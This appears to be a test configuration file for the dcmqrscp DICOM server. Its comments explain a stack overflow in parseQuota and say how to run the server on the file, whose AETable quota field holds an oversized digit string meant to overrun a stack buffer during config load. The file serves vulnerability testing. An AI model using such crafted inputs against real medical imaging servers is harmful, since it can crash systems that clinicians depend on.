# CVE-2020-36855 — DcmQueryRetrieveConfig::parseQuota stack-based overflow.
# The AETable StorageQuota field is "(maxStudies, maxBytesPerStudy)".
# parseQuota copies the study-count token into a fixed-size stack buffer
# without a bound check; a 280-digit count overruns it.
#
# Black-box test artifact: point a dcmqrscp build at this file
#   dcmqrscp -c cve_2020_36855_oversized_quota_count.cfg 11114
# and watch for a stack-smashing abort during config load.
NetworkTCPPort  = 11114
MaxPDUSize      = 16384
MaxAssociations = 4

HostTable BEGIN
caller    = (C-SCARE-FZ, 127.0.0.1, 11112)
HostTable END

VendorTable BEGIN
VendorTable END

AETable BEGIN
DCMQRSCP    /tmp/c-scare-dcmqrscp    RW (9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999, 1024mb)    caller
AETable END
